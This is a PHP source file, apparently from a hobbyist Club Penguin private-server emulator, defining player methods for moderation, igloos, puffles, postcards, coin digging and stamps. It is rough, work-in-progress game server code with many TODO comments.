      $this->isMuted ? $this->sendRoomPacket("%xt%ma%-1%m%{$this->id}%{$this->name} | by {$playerName}%") : false;
      $this->isMuted = !$this->isMuted;
      
      return true;
    }
    
    public function kick($playerName, $byAdmin = false) {
      if($this->isMod && !$byAdmin) return false;
      
      $this->sendRoomPacket("%xt%ma%-1%k%{$this->id}%{$this->name} | by {$playerName}%");
      $this->sendError(\iCPro\Errors::KICK);
      
      return $this->disconnect();
    }
    
    public function autoBan() {
      $this->sendRoomPacket("%xt%ma%-1%k%{$this->id}%{$this->name} by Server%");
      $this->sendError(\iCPro\Errors::GAME_CHEAT);
      
      return $this->disconnect();
    }
    
    public function ban($reason, $type = \iCPro\Errors::AUTO_BAN) {
      $this->sendError($type, $reason);
      return $this->disconnect();
    }
    
    public function disconnect() {
      return EventListener::FireEvent(Events::CLIENT_DISCONNECTED, $this->clientId);
    }
    
    # # # # # # # # # # #
    // !Table Functions
    # # # # # # # # # # #
    
    public function getTables($tables) {
      array_shift($tables);
      
      $response = "%xt%gt%{$this->room}%";
      foreach($tables as $tableId) {
        $tableId = (integer)$tableId;
        $table = $this->room->tables[$tableId];
        $response .= is_null($table) ? $tableId . '|-1%' : $table->id . '|' . count($table->players) . '%';
      } return $this->sendPacket($response);
    }
    
    public function joinGame(\iCPro\Games\GameType $game) {
      if($this->game) $this->game->removePlayer($this);
      $this->currentGame = $game;
      
      $game->addPlayer($this);
      
      return true;
    }
    
    public function leaveGame($sendRemove = true) {
      if(is_null($this->game)) return;
      if($sendRemove) $this->game->removePlayer($this);
      $this->currentGame = null;
    }
    
    # # # # # # # # # # #
    // !Igloo Functions
    # # # # # # # # # # #
    
    // e.G. $this->hasIglooElement('iglooFloors', 3);
    public function hasIglooElement($key, $elementId) {
      $elements = split(',', $this->$key);
      foreach($elements as $element) {
        $data = explode('|', $element);
        $id = (integer)$data[0];
        if($id == $elementId) return true;
      } return false;
    }
    
    public function addIglooElement($key, $id) {
      $element = $id . '|' . time();
      
      if($this->hasIglooElement($key, $id)) return $this->sendError(\iCPro\Errors::ITEM_IN_HOUSE);
      
      $crumb = $this->buyCrumb($key, $id); // Could check if it's a member item here :P
      
      $this->$key .= ($this->$key == '' ? '' : ',') . $element;
      $this->updateProperty('iglooInventory', $this->iglooInventory);
      
      return true;
    }
    
    public function loadIgloo() {
      return; // Doubt this method is needed. I wasted some time of my life writing this and I will never get it back.
      
      $igloos = \MySQL::Select('igloos', array( 'playerId' => $this->id ));
      extract($igloos[0]); // ... evil!
      
      $this->iglooType = $type;
      $this->iglooFurniture = $furniture;
      $this->iglooMusic = $music;
      $this->iglooLocation = $location;
      $this->iglooFloor = $floor;
      
      // Never.
      // (which is why I will keep this method as memorial for the wasted moments of my life)
    }
    
    public function openIgloo()  { $this->server->data['OpenIgloos'][$this->id] = $this->name; }
    public function closeIgloo() { unset($this->server->data['OpenIgloos'][$this->id]);        }
    
    public function getIglooDetails($playerId) { // TODO: Selected igloo!
      if(!isset($this->server->users[$playerId])) return$this->sendPacket("%xt%gm%{$this->room}%{$playerId}%1%1%1%");
      
      $iglooId = (integer)$this->server->users[$playerId]['activeIglooId'];
      $igloos = \MySQL::Select('igloos', array( 'id' => $iglooId ));
      if(count($igloos) != 1) var_dump("Failure in getIglooDetails, count(igloos) != 1:", $igloos); // TODO: Error report.
      
      $iglooDetails = self::SerializeIgloo($igloos[0]);
      return $this->sendPacket("%xt%gm%{$this->room}%{$playerId}%{$iglooDetails}%");
    }
    
    public function updateIglooFurniture($data) {
      return; // TODO: Is this needed?
      $something = array_shift($data);
      return $this->isTryout or $this->server->updateIglooProperty($this->id, 'furniture', $this->iglooFurniture = join(',', $data));
    }
    
    public function updateIglooFloor($floorId) {
      $this->addIglooElement('iglooFloors', $floorId);
    //$this->updateIglooProperty('floor', $floorId);
      $this->sendPacket("%xt%ag%{$this->room}%{$floorId}%{$this->coins}%");
    }
    
    public function updateIglooType($buildingId) {
      $this->addIglooElement('iglooBuildings', $buildingId);
      
      /*
      $this->iglooFloor = 0; // Reset this ...
      $this->iglooFurniture = ''; // ... and this.
      $this->updateIglooProperty('type', $buildingId); // TODO: Should be named 'building'!
      */
      
      $this->sendPacket("%xt%au%{$this->room}%{$buildingId}%{$this->coins}%");
    }
    
    public function updateIglooMusic($musicId) {
      if($this->iglooMusic == $musicId) return $this->sendError(\iCPro\Erors::ITEM_IN_HOUSE);
      $this->updateIglooProperty('music', $musicId);
    }
    
    public function updateIglooLocation($locationId) {
      $this->addIglooElement('iglooLocations', $locationId);
    //$this->updateIglooProperty('location', $locationId);
      $this->sendPacket("%xt%aloc%{$this->room}%{$locationId}%{$this->coins}%");
    }
    
    public function addFurniture($furnitureId) {
      $item = $this->buyCrumb('iglooItems', $furnitureId);
      $this->increaseFurnitureCount($furnitureId);
      $this->sendPacket("%xt%af%{$this->room}%{$furnitureId}%{$this->coins}%");
    }
    
    protected function increaseFurnitureCount($furnitureId, $increment = 1) {
      list($furniture, $floors, $buildings, $locations) = explode('%', $this->iglooInventory);
      
      $furns = explode(',', $furniture);
      foreach($furns as $furn) {
        list($id, $timestamp, $count) = explode('|', $furn);
        if((integer)$id == $furnitureId) {
          $newCount = ((integer)$count) + $increment;
          $furniture = substr(str_replace("%{$furn}%", "%{$id}|{$timestamp}|{$newCount}%", "%{$this->iglooInventory}%"), 1, -1);
          break;
        }
      }
      
      $furniture .= ($furniture == '' ? '' : ',') . "{$furnitureId}|" . time() . "|{$increment}";
      $this->updateProperty('iglooInventory', join('%', array( $furniture, $floors, $buildings, $locations )));
      return true;
    }
    
    public static function SerializeIgloo($igloo) {
      if(is_numeric($igloo)) { // You can call this with an igloo-id.
        $igloo = \MySQL::Select('igloos', array( 'id' => $igloo ));
        $igloo = $igloo[0];
      }
      
      // igloo-id:slotNumber:?:isLocked:music:flooring:location:building:like-count:furniture
      extract($igloo);
      return "{$id}:{$slotNumber}:1:{$isLocked}:{$music}:{$floor}:{$location}:{$type}:0:{$furniture}";
    }
    
    public function sendAllIglooLayouts($playerId) {
      $totalLikes = 0;
      $gaili = '';
      
      foreach(\MySQL::Select('igloos', array( 'playerId' => $playerId )) as $igloo) {
        $this->sendPacket("%xt%gail%{$this->room}%{$playerId}%0%" . self::SerializeIgloo($igloo) . "%");
        $gaili .= $igloo['id'] . '|' . $igloo['likeCount'] . '%';
        $totalLikes += (integer)$igloo['likeCount'];
      } $this->sendPacket("%xt%gaili%{$this->room}%{$totalLikes}%{$gaili}");
    }
    
    public function addIglooLayout($something) {
      $igloos = \MySQL::Select('igloos', array( 'playerId' => $this->id ));
      if(\MySQL::Insert('igloos', array( 'playerId' => $this->id, 'slotNumber' => count($igloos)+1 ))) {
        $id = mysql_insert_id();
        var_dump("Igloo id:", $id);
        $this->sendPacket("%xt%al%{$this->room}%{$this->id}%" . self::SerializeIgloo($id) . "%");
      } else; // TODO: Error report, something failed D:
    }
    
    public function updateIglooLayout($iglooId, $serialized) {
      list($type, $floor, $location, $music, $furniture) = $serialized;
      \MySQL::Update('igloos', array(
        'type' => $type,
        'floor' => $floor,
        'location' => $location,
        'music' => $music,
        'furniture' => $furniture
      ), array(
        'id' => $iglooId,
        'playerId' => $this->id
      ));
      // TODO: No response to this?
    }
    
    public function updateIglooSlots($activeIglooId, $slots) {
      if(count(\MySQL::Select('igloos', array( 'id' => $activeIglooId, 'playerId' => $this->id))) != 1)
        return; // TODO: Error report
      $this->updateProperty('activeIglooId', $activeIglooId);
      
      foreach(explode(',', $slots) as $slot) { // Update what igloos are locked to friends and which ones are open for everyone.
        list($iglooId, $isLocked) = explode('|', $slot);
        \MySQL::Update('igloos', array( 'isLocked' => (integer)$isLocked ), array( 'id' => (integer)$iglooId, 'playerId' => $this->id ));
      }
    }
    
    # # # # # # # # # # #
    // !Puffle Functions
    # # # # # # # # # # #
    
    public static function getPuffles($playerId, $area = false) {
      $puffles = array();
      if($area) { // An area is specified
        if($area != "backyard") $area = "igloo"; // area is either "igloo" or "backyard"
        $puffles = \MySQL::Select('puffles', array(
           'playerId' => (integer)$playerId,
               'area' => $area,
          'isWalking' => 0 // Only capture puffles that are present
        ));
      } else $puffles = \MySQL::Select('puffles', array( 'playerId' => (integer)$playerId )); // No area? Then get all puffles.
      
      $puffleString = "";
      foreach($puffles as $puffle) $puffleString .= self::makePuffleCrumb($puffle) . '%';
      return $puffleString;
    }
    
    public static function makePuffleCrumb($puffle) { // TODO: Make this kind of methods static.
      return join('|', array(
        $puffle['id'],
        $puffle['type'],
        $puffle['subType'] == 0 ? '' : $puffle['subType'],
        $puffle['name'],
        1397994444, // TODO: Investigate
        $puffle['statsFood'], $puffle['statsRest'], $puffle['statsPlay'], $puffle['statsClean'],
        $puffle['hat'],
        0, 0, // x, y
        $puffle['isWalking'] // TODO: What is this used for?
      ));
    }
    
    public function sendPuffleSwap($puffleId, $area) {
      if(!$this->room instanceof Rooms\Igloo && $this->room->id != $this->id) return false; // TODO: Error report & ->inMyIgloo method
      if($area != "backyard") $area = "igloo"; // area is either "igloo" or "backyard"
      \MySQL::Update('puffles', array( // TODO: Error report when none updated.
        'area' => $area
      ), array(
        'id' => $puffleId,
        'playerId' => $this->id // Don't let them move others' puffles
      ));
      
      // TODO: Remove other puffle.
      $this->room->sendPacket("%xt%puffleswap%{$this->room}%{$puffleId}%{$area}%");
    }
    
    public function sendPuffleMove($puffleId, $x, $y) {
      $this->sendRoomPacket("%xt%pm%{$this->room}%{$puffleId}%{$x}%{$y}%");
      $this->pufflePositions[$puffleId] = array($x, $y);
      
      return true;
    }
    
    public function sendPuffleAction($action, $cost, $puffleId) {
      if(!$puffleString = $this->getPuffleString($puffleId)) return false;
      $this->subtractCoins($cost);
      $this->sendRoomPacket("%xt%{$action}%{$this->roomId}%{$this->coins}%{$puffleString}%");
    }
    
    public function getPuffleString($puffleId) {
      $rawPuffles = explode('%', self::getPuffles($this->id));
      foreach($rawPuffles as $puffle) if($puffle && strstr($puffle, '|', true) == $puffleId) return $puffle;
      
      return false;
    }
    
    private static $getWalkingPuffleCache = array();
    public static function getWalkingPuffle($playerId) {
      if($playerId instanceof \iCPro\Users\User) $playerId = $playerId->id; // For convenience, also allow ::getWalkingPuffle(iCPUser);
      if(self::$getWalkingPuffleCache[$playerId]) return self::$getWalkingPuffleCache[$playerId];
      
      $puffle = \MySQL::Select('puffles', array(
        'playerId' => $playerId,
        'isWalking' => 1
      ));
      
      if(count($puffle) > 1) {
        \Debugger::Debug(\DebugFlags::WARNING, sprintf('<inv>%d</inv> is walking multiple puffles:', $playerId));
        var_dump($puffle);
        // TODO: Reset 'isWalking´ in the database?
      }
      
      self::$getWalkingPuffleCache[$playerId] = $puffle[0];
      return $puffle[0];
    }
    
    public function sendWalkPuffle($puffleId, $toWalkOrNotToWalk) {
      if($toWalkOrNotToWalk) $this->walkPuffle($puffleId);
      else $this->dropPuffle(); // Silently assume that this matches the puffle-id... (it should)
    }
    
    public function dropPuffle($sendPackets = true) {
      $puffle = self::getWalkingPuffle($this);
      if(is_null($puffle)) return; // Nothing to do.
      
      \MySQL::Update('puffles', array( 'isWalking' => 0 ), array( 'id' => $puffle['id'] ));
      $puffle['isWalking'] = 0; // ... for makePuffleCrumb :)
      
      unset(self::$getWalkingPuffleCache[$this->id]);
      if(!$sendPackets) return;
      
      if($this->room instanceof Rooms\Igloo && $this->room->id == $this->id) // If we are in our igloo
        $this->room->sendPacket("%xt%addpuffle%{$this->room}%" . self::makePuffleCrumb($puffle) . "%");
      $this->room->sendPacket("%xt%pw%{$this->room}%{$this->id}%{$puffle['id']}%{$puffle['type']}%0%0%0%"); // TODO: Puffle items
    }
    
    public function walkPuffle($puffleId, $sendPackets = true) {
      $this->dropPuffle($sendPackets); // Ensure we're not walking a puffle right now
      
      $puffle = \MySQL::Select('puffles', array( 'id' => $puffleId, 'playerId' => $this->id ));
      $puffle = $puffle[0];
      
      if(is_null($puffle)) return false; // TODO: Should report an error here.
      
      \MySQL::Update('puffles', array( 'isWalking' => 1 ), array( 'id' => $puffleId ));
      $this->refreshPlayerString();
      
      self::$getWalkingPuffleCache[$this->id] = $puffle;
      if(!$sendPackets) return $puffle;
      
      $this->room->sendPacket("%xt%pw%{$this->room}%{$this->id}%{$puffle['id']}%{$puffle['type']}%0%1%0%"); // TODO: Puffle items
      return $puffle;
    }
    
    public function swapWalkingPuffle($puffleId) {
      if($puffle = $this->walkPuffle($puffleId))
        $this->room->sendPacket("%xt%pufflewalkswap%{$this->room}%{$this->id}%{$puffle['id']}%0%0%1%{$puffle['hat']}%"); // TODO!
      else; // TODO: We should report an error here.
    }
    
    public function adoptPuffle($puffleType, $puffleName, $puffleSubType) {
      $min = \iCPro\SettingsManager::GetSetting(\iCPro\Settings::PUFFLE_MINLEN);
      $max = \iCPro\SettingsManager::GetSetting(\iCPro\Settings::PUFFLE_MAXLEN);
      $chr = \iCPro\SettingsManager::GetSetting(\iCPro\Settings::PUFFLE_CHARS);
      
      if(!\iCPro\Utils::CheckString($chr, $min, $max, $puffleName)) return $this->sendError(\iCPro\Errors::PUFFLE_INVALID);
      
      $this->subtractCoins(800); // TODO: This isn't always 800 coins, sorry.
      
      \MySQL::Insert('puffles', array(
        'type'     => $puffleType,
        'subType'  => $puffleSubType,
        'name'     => $puffleName,
        'playerId' => $this->id
      ));
      
      $puffles = explode('%', self::getPuffles($this->id));
      $puffleCrumb = $puffles[count($puffles) - 2]; // TODO: What the?! is this?!
      
      return $this->sendPacket("%xt%pn%{$this->room}%{$this->coins}%{$puffleCrumb}%");
    }
    
    public function sendPuffleTrick($trickId) {
      $puffle = self::getWalkingPuffle($this);
      if(is_null($puffle)) return; // TODO: Error report.
      $this->room->sendPacket("%xt%puffletrick%{$this->room}%{$this->id}%{$trickId}%");
    }
    
    public function sendPuffleDig($onCommand = true) {
      $puffle = self::getWalkingPuffle($this);
      if(is_null($puffle)) return; // TODO: Error report.
      
      if(!$onCommand && rand(0, 3) != 0) return; // Not this time, sorry bro.
      
      $items = array(3028, 232, 412, 112, 184, 1056, 6012, 118, 774, 366, 103, 498, 469, 1082, 5196, 790, 4039, 326, 105, 122, 5080, 111, 2032, 784);
      $furniture = array(305, 313, 504, 506, 500, 501, 503, 507, 505, 502, 616, 542, 340, 150, 149, 369, 370, 300);
      
      // TODO: Remove $items we already have!
      
      $type = rand(0, 2) == 0 ? rand(1, 4) : 0;
      $item = 0;
      $quantity = 0;
      
      // types: 0(coins), 1(fav.-food), 2(furniture), 3(clothing), 4(gold-nugget)
      switch($type) { // TODO: Enum!
        case 0: $quantity = rand(20, 400) * 5; $this->addCoins($quantity); break;
        case 2: $item = $furniture[rand(0, count($furniture)-1)]; break;
        case 3: $item = $items[rand(0, count($items)-1)]; break;
        case 4: $quantity = rand(10, 20); break;
      }
      
      // player-id|puffle-id|treasure-type|treasure-id|quantity|is-first-success|fail-safe
      $this->room->sendPacket("%xt%puffledig%{$this->room}%{$this->id}%{$puffle['id']}%{$type}%{$item}%{$quantity}%0%false%");
      
      // TODO: Make the change persistent.
    }
    
    // Walking a Puffle just changes the iCPUser::$playerPuffle Variable,
    // Which means, when a Users loads the Puffles, the Server checks,
    // If the PuffleOwner is online.
    // If he is, it checks, if its walking with a Puffle currently.
    // If so, that puffle is removed.
    // If not, its not.
    // If the Player is not online, nothing changes.
    // If the Player walks another Puffle...
    // Well, obvious.
    
    # # # # # # # # # #
    // !Mail Functions
    # # # # # # # # # #
    
    public function startMailEngine() {
      $crumb = $this->server->users[$this->id];
      $this->getPlayerMail();
      return $this->sendPacket("%xt%mst%-1%{$crumb['newMail']}%{$crumb['mailCount']}%");
    }
    
    public function getPlayerMail() {
      if($this->server->users[$this->id]['mail']) return $this->server->users[$this->id]['mail'];
      
      $this->server->users[$this->id]['mail']      = '';
      $this->server->users[$this->id]['mailCount'] =
      $this->server->users[$this->id]['newMail']   = $i = 0;
      $data = \MySQL::Select('postcards', array( 'postcardRecipient' => $this->id ));
      foreach($data as $line) $this->server->users[$this->id]['mail'] .= $this->createMailString($line, $i++) . '%'; 
      
      return $this->server->users[$this->id]['mail'];
    }
    
    public function createMailString($line, $uId, $seperator = '|') {
      ++$this->server->users[$this->id]['mailCount'];
      $this->server->users[$this->id]['newMail'] += 1 - $line['postcardRead'];
      $retVal .= $this->server->users[$line['postcardSender']]['name'] . $seperator;
      $retVal .= $line['postcardSender']    . $seperator;
      $retVal .= $line['postcardId']        . $seperator;
      $retVal .= $line['postcardAddition']  . $seperator;
      $retVal .= $line['postcardTimestamp'] . $seperator;
      $retVal .= $uId;
      
      return $retVal;
    }
    
    public function sendMail($recipientId, $cardId, $additional) {
      $addition  = ''; //... Always '' till the \MySQL::SafeString() works ...//
      $timestamp = time();
      \MySQL::Insert('Postcards', array(
        'postcardSender'    => $this->id,
        'postcardRecipient' => $recipientId,
        'postcardId'        => $cardId,
        'postcardRead'      => 0,
        'postcardAddition'  => $addition,
        'postcardTimestamp' => $timestamp
      ));
      
      $this->subtractCoins(10);
      $this->sendPacket("%xt%ms%{$this->room}%{$this->coins}%1%");
      if(!isset($this->server->alias[$recipientId])) return false;
      $user = &$this->server->alias[$recipientId];
      
      $mail['postcardSender']    = $this->id;
      $mail['postcardId']        = $cardId;
      $mail['postcardAddition']  = $additional;
      $mail['postcardTimestamp'] = $timestamp;
      $mail = $user->createMailString($mail, $this->server->users[$recipientId]['newMail'], '%');
      
      return $user->sendPacket("%xt%mr%-1%{$mail}%");
    }
    
    public function checkMail() {
      echo "\no\tic-tacs!";
    }
    
    # # # # # # # # # #
    // !Room Functions
    # # # # # # # # # #
    
    public function digForCoins($coins = 0) {
      if(!$coins) {
        if(rand(0, 5)) return false;
        
        $coins = rand(0, 50);
        if($coins < 25)     $coins = 2;
        elseif($coins < 37) $coins = 5;
        elseif($coins < 43) $coins = 10;
        elseif($coins < 47) $coins = 25;
        else                     $coins = 100;
        
        if(time() - $this->lastDig < \iCPro\SettingsManager::GetSetting(\iCPro\Settings::DIG_TTL))
          return $this->ban(\iCPro\SettingsManager::GetSetting(\iCPro\Settings::DIGHACK_BAN));
        $this->lastDig = time();
      }
      
      $this->addCoins($coins);
      return $this->sendPacket("%xt%cdu%{$this->room}%{$coins}%{$this->coins}%");
    }
    
    public function donateCoins($cat, $amount) {
      if($amount < 1) $amount = 1;
      $this->subtractCoins($amount);
      
      $cats = array(-1 => 'UnknownCategory', 'CategoryOne', 'CategoryTwo', 'CategoryThree');
      if(!$cats[$cat]) $cat = -1;
      
      $file = fopen(DATA_DIR . '/donations/' . $files[$cat] . '.txt', 'a+');
      fwrite($file, "{$this->name} [{$this->id}] spent {$amount}\n");
      fclose($file);
      
      return true;
    }
    
    # # # # # # # # # # #
    // !Survey Functions
    # # # # # # # # # # #
    
    public function handleDonateCoins($cat, $amount) {
      // TODO?
    }
    
    public function votePenguinAwards($votings) { // TODO: Use MySQL
      if($this->hasVoted == ($this->hasVoted = true)) return;
      list($bestPlay, $bestCostume, $bestMusic, $bestEffects, $bestSet) = explode(',', $votings);
      
      $playFile    = fopen(DATA_DIR . '/penguin-awards/PlayAwards.txt',    'a+');
      $costumeFile = fopen(DATA_DIR . '/penguin-awards/CostumeAwards.txt', 'a+');
      $musicFile   = fopen(DATA_DIR . '/penguin-awards/MusicAwards.txt',   'a+');
      $effectsFile = fopen(DATA_DIR . '/penguin-awards/EffectsAwards.txt', 'a+');
      $setFile     = fopen(DATA_DIR . '/penguin-awards/SetAwards.txt',     'a+');
      
      fwrite($playFile,    "{$bestPlay},");
      fwrite($costumeFile, "{$bestCostume},");
      fwrite($musicFile,   "{$bestMusic},");
      fwrite($effectsFile, "{$bestEffects},");
      fwrite($setFile,     "{$bestSet},");
      
      fclose($playFile);
      fclose($costumeFile);
      fclose($musicFile);
      fclose($effectsFile);
      fclose($setFile);
      
      return true;
    }
    
    public function signIglooContest() { // TODO: Use MySQL!
      $file = fopen(DATA_DIR . '/igloo-contest/Signs.txt', 'a+');
      fwrite($file, "{$this->id}\n");
      fclose($file);
      
      return true;
    }
    
    # # # # # # # # # # #
    // !Stamp Functions
    # # # # # # # # # # #
    
    public function sendGetPlayerStamps($playerId) {
      $stamps = $this->server->getPlayerStamps($playerId);
      if(!$stamps) return; // TODO: Error report.
      $this->sendPacket("%xt%gps%-1%{$playerId}%{$stamps}%");
    }
    
    public function sendStampEarned($stampId) {
      $stamps = $this->stamps == '' ? array() : explode('|', $this->stamps);
      $stamps[] = (string)(integer)$stampId;
      $this->updateProperty('stamps', join('|', array_unique($stamps)));
    }
    
    # # # # # # # #
    // !TODO-AREA
    # # # # # # # #
    
    public function updateProperty($name, $value) { // TODO: Get rid of updateUserProperty in methods other than 'updateProperty´
      $this->$name = $value;
      if($this->isTryout) return false;
      
      return $this->server->updateUserProperty($this->id, $name, $value);
    }
    
    public function updateIglooProperty($name, $value) {
      if($this->isTryout) return false;
      \MySQL::Update('igloos', array( $name => $value ), 'id IN (SELECT activeIglooId FROM users WHERE playerId = ' . (integer)$this->id . ')');
    }
  }

?>